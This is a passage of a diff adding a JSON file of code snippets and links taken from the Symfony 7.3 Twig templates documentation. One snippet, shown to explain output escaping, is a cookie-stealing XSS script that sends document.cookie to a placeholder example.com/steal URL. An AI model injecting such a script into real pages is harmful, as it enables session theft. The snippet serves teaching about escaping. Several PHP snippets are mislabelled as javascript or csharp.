+      "code": "# check all the application templates\n$ php bin/console lint:twig\n\n# you can also check directories and individual templates\n$ php bin/console lint:twig templates/email/\n$ php bin/console lint:twig templates/article/recent_list.html.twig\n\n# you can also show the deprecated features used in your templates\n$ php bin/console lint:twig --show-deprecations templates/email/\n\n# you can also excludes directories\n$ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool",
+      "language": "unknown"
+    },
+    {
+      "code": "$ php bin/console lint:twig --format=github",
+      "language": "unknown"
+    },
+    {
+      "code": "# list general information\n$ php bin/console debug:twig\n\n# filter output by any keyword\n$ php bin/console debug:twig --filter=date\n\n# pass a template path to show the physical file which will be loaded\n$ php bin/console debug:twig @Twig/Exception/error.html.twig",
+      "language": "unknown"
+    },
+    {
+      "code": "$ composer require --dev symfony/debug-bundle",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/article/recent_list.html.twig #}\n{# the contents of this variable are sent to the Web Debug Toolbar\n   instead of dumping them inside the page contents #}\n{% dump articles %}\n\n{% for article in articles %}\n    {# the contents of this variable are dumped inside the page contents\n       and they are visible on the web page #}\n    {{ dump(article) }}\n\n    {# optionally, use named arguments to display them as labels next to\n       the dumped contents #}\n    {{ dump(blog_posts: articles, user: app.user) }}\n\n    <a href=\"/article/{{ article.slug }}\">\n        {{ article.title }}\n    </a>\n{% endfor %}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/index.html.twig #}\n\n{# ... #}\n<div class=\"user-profile\">\n    <img src=\"{{ user.profileImageUrl }}\" alt=\"{{ user.fullName }}\">\n    <p>{{ user.fullName }} - {{ user.email }}</p>\n</div>",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/index.html.twig #}\n\n{# ... #}\n{{ include('blog/_user_profile.html.twig') }}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/index.html.twig #}\n\n{# ... #}\n{{ include('blog/_user_profile.html.twig', {user: blog_post.author}) }}",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Controller/BlogController.php\nnamespace App\\Controller;\n\nuse Symfony\\Component\\HttpFoundation\\Response;\n// ...\n\nclass BlogController extends AbstractController\n{\n    public function recentArticles(int $max = 3): Response\n    {\n        // get the recent articles somehow (e.g. making a database query)\n        $articles = ['...', '...', '...'];\n\n        return $this->render('blog/_recent_articles.html.twig', [\n            'articles' => $articles\n        ]);\n    }\n}",
+      "language": "javascript"
+    },
+    {
+      "code": "{# templates/blog/_recent_articles.html.twig #}\n{% for article in articles %}\n    <a href=\"{{ path('blog_show', {slug: article.slug}) }}\">\n        {{ article.title }}\n    </a>\n{% endfor %}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/base.html.twig #}\n\n{# ... #}\n<div id=\"sidebar\">\n    {# if the controller is associated with a route, use the path() or url() functions #}\n    {{ render(path('latest_articles', {max: 3})) }}\n    {{ render(url('latest_articles', {max: 3})) }}\n\n    {# if you don't want to expose the controller with a public URL,\n       use the controller() function to define the controller to execute #}\n    {{ render(controller(\n        'App\\\\Controller\\\\BlogController::recentArticles', {max: 3}\n    )) }}\n</div>",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/framework.yaml\nframework:\n    # ...\n    fragments: { path: /_fragment }",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/framework.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n    <!-- ... -->\n    <framework:config>\n        <framework:fragment path=\"/_fragment\"/>\n    </framework:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/framework.php\nuse Symfony\\Config\\FrameworkConfig;\n\nreturn static function (FrameworkConfig $framework): void {\n    // ...\n    $framework->fragments()->path('/_fragment');\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "{{ render_hinclude(controller('...')) }}\n{{ render_hinclude(url('...')) }}",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/framework.yaml\nframework:\n    # ...\n    fragments:\n        hinclude_default_template: hinclude.html.twig",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/framework.xml -->\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n    <!-- ... -->\n    <framework:config>\n        <framework:fragments hinclude-default-template=\"hinclude.html.twig\"/>\n    </framework:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/framework.php\nuse Symfony\\Config\\FrameworkConfig;\n\nreturn static function (FrameworkConfig $framework): void {\n    // ...\n    $framework->fragments()\n        ->hincludeDefaultTemplate('hinclude.html.twig')\n    ;\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "{{ render_hinclude(controller('...'),  {\n    default: 'default/content.html.twig'\n}) }}",
+      "language": "unknown"
+    },
+    {
+      "code": "{{ render_hinclude(controller('...'), {default: 'Loading...'}) }}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# by default, cross-site requests don't use credentials such as cookies, authorization\n   headers or TLS client certificates; set this option to 'true' to use them #}\n{{ render_hinclude(controller('...'), {attributes: {'data-with-credentials': 'true'}}) }}\n\n{# by default, the JavaScript code included in the loaded contents is not run;\n   set this option to 'true' to run that JavaScript code #}\n{{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/base.html.twig #}\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>{% block title %}My Application{% endblock %}</title>\n        {% block stylesheets %}\n            <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/base.css\">\n        {% endblock %}\n    </head>\n    <body>\n        {% block body %}\n            <div id=\"sidebar\">\n                {% block sidebar %}\n                    <ul>\n                        <li><a href=\"{{ path('homepage') }}\">Home</a></li>\n                        <li><a href=\"{{ path('blog_index') }}\">Blog</a></li>\n                    </ul>\n                {% endblock %}\n            </div>\n\n            <div id=\"content\">\n                {% block content %}{% endblock %}\n            </div>\n        {% endblock %}\n    </body>\n</html>",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/layout.html.twig #}\n{% extends 'base.html.twig' %}\n\n{% block content %}\n    <h1>Blog</h1>\n\n    {% block page_contents %}{% endblock %}\n{% endblock %}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/index.html.twig #}\n{% extends 'blog/layout.html.twig' %}\n\n{% block title %}Blog Index{% endblock %}\n\n{% block page_contents %}\n    {% for article in articles %}\n        <h2>{{ article.title }}</h2>\n        <p>{{ article.body }}</p>\n    {% endfor %}\n{% endblock %}",
+      "language": "unknown"
+    },
+    {
+      "code": "{# templates/blog/index.html.twig #}\n{% extends 'base.html.twig' %}\n\n{# the line below is not captured by a \"block\" tag #}\n<div class=\"alert\">Some Alert</div>\n\n{# the following is valid #}\n{% block content %}My cool blog posts{% endblock %}",
+      "language": "unknown"
+    },
+    {
+      "code": "My Name\n<script type=\"text/javascript\">\n    document.write('<img src=\"https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '\" style=\"display:none;\">');\n</script>",
+      "language": "unknown"
+    },
+    {
+      "code": "<p>Hello {{ name }}</p>\n{# if 'name' is '<script>alert('hello!')</script>', Twig will output this:\n   '<p>Hello &lt;script&gt;alert(&#39;hello!&#39;)&lt;/script&gt;</p>' #}",
+      "language": "unknown"
+    },
+    {
+      "code": "<h1>{{ product.title|raw }}</h1>\n{# if 'product.title' is 'Lorem <strong>Ipsum</strong>', Twig will output\n   exactly that instead of 'Lorem &lt;strong&gt;Ipsum&lt;/strong&gt;' #}",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/twig.yaml\ntwig:\n    # ...\n    paths:\n        # directories are relative to the project root dir (but you\n        # can also use absolute directories)\n        'email/default/templates': ~\n        'backend/templates': ~",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/twig.xml -->\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n    <twig:config>\n        <!-- ... -->\n        <!-- directories are relative to the project root dir (but you\n             can also use absolute directories -->\n        <twig:path>email/default/templates</twig:path>\n        <twig:path>backend/templates</twig:path>\n    </twig:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/twig.php\nuse Symfony\\Config\\TwigConfig;\n\nreturn static function (TwigConfig $twig): void {\n    // ...\n\n    // directories are relative to the project root dir (but you\n    // can also use absolute directories)\n    $twig->path('email/default/templates', null);\n    $twig->path('backend/templates', null);\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "# config/packages/twig.yaml\ntwig:\n    # ...\n    paths:\n        'email/default/templates': 'email'\n        'backend/templates': 'admin'",
+      "language": "unknown"
+    },
+    {
+      "code": "<!-- config/packages/twig.xml -->\n<container xmlns=\"http://symfony.com/schema/dic/services\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n    xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n        https://symfony.com/schema/dic/services/services-1.0.xsd\n        http://symfony.com/schema/dic/twig https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n    <twig:config>\n        <!-- ... -->\n        <twig:path namespace=\"email\">email/default/templates</twig:path>\n        <twig:path namespace=\"admin\">backend/templates</twig:path>\n    </twig:config>\n</container>",
+      "language": "unknown"
+    },
+    {
+      "code": "// config/packages/twig.php\nuse Symfony\\Config\\TwigConfig;\n\nreturn static function (TwigConfig $twig): void {\n    // ...\n\n    $twig->path('email/default/templates', 'email');\n    $twig->path('backend/templates', 'admin');\n};",
+      "language": "unknown"
+    },
+    {
+      "code": "{{ product.price|price }}\n\n{# pass in the 3 optional arguments #}\n{{ product.price|price(2, ',', '.') }}",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Twig/AppExtension.php\nnamespace App\\Twig;\n\nuse Twig\\Attribute\\AsTwigFilter;\n\nclass AppExtension\n{\n    #[AsTwigFilter('price')]\n    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string\n    {\n        $price = number_format($number, $decimals, $decPoint, $thousandsSep);\n        $price = '$'.$price;\n\n        return $price;\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "// src/Twig/AppExtension.php\nnamespace App\\Twig;\n\nuse Twig\\Attribute\\AsTwigFunction;\n\nclass AppExtension\n{\n    #[AsTwigFunction('area')]\n    public function calculateArea(int $width, int $length): int\n    {\n        return $width * $length;\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "# display all information about Twig\n$ php bin/console debug:twig\n\n# display only the information about a specific filter\n$ php bin/console debug:twig --filter=price",
+      "language": "unknown"
+    },
+    {
+      "code": "// src/Twig/AppExtension.php\nnamespace App\\Twig;\n\nuse App\\Twig\\AppRuntime;\nuse Twig\\Extension\\AbstractExtension;\nuse Twig\\TwigFilter;\n\nclass AppExtension extends AbstractExtension\n{\n    public function getFilters(): array\n    {\n        return [\n            // the logic of this filter is now implemented in a different class\n            new TwigFilter('price', [AppRuntime::class, 'formatPrice']),\n        ];\n    }\n}",
+      "language": "csharp"
+    },
+    {
+      "code": "// src/Twig/AppRuntime.php\nnamespace App\\Twig;\n\nuse Twig\\Extension\\RuntimeExtensionInterface;\n\nclass AppRuntime implements RuntimeExtensionInterface\n{\n    public function __construct()\n    {\n        // this simple example doesn't define any dependency, but in your own\n        // extensions, you'll need to inject services using this constructor\n    }\n\n    public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string\n    {\n        $price = number_format($number, $decimals, $decPoint, $thousandsSep);\n        $price = '$'.$price;\n\n        return $price;\n    }\n}",
+      "language": "csharp"
+    }
+  ],
+  "patterns": [],
+  "links": [
+    "https://symfony.com/doc/7.3/templates.html",
+    "https://symfony.com/doc/7.3/controller.html",
+    "https://symfony.com/doc/7.3/mailer.html",
+    "https://symfony.com/doc/7.3/setup.html",
+    "https://symfony.com/doc/7.3/reference/twig_reference.html",
+    "https://symfony.com/doc/7.3/configuration.html",
+    "https://symfony.com/doc/7.3/reference/configuration/twig.html",
+    "https://symfony.com/doc/7.3/routing.html",
+    "https://symfony.com/doc/7.3/frontend.html",
+    "https://symfony.com/doc/7.3/components/asset.html",
+    "https://symfony.com/doc/7.3/reference/configuration/framework.html",
+    "https://symfony.com/doc/7.3/security.html",
+    "https://symfony.com/doc/7.3/components/http_foundation.html",
+    "https://symfony.com/doc/7.3/components/http_kernel.html",
+    "https://symfony.com/doc/7.3/session.html",
+    "https://symfony.com/doc/7.3/configuration/front_controllers_and_kernel.html",
+    "https://symfony.com/doc/7.3/translation.html",
+    "https://symfony.com/doc/7.3/service_container.html",
+    "https://symfony.com/doc/7.3/service_container/autowiring.html",
+    "https://symfony.com/doc/7.3/components/var_dumper.html",
+    "https://symfony.com/doc/7.3/http_cache/esi.html",
+    "https://symfony.com/doc/7.3/bundles/override.html",
+    "https://symfony.com/doc/7.3/service_container/tags.html"
+  ]
+}
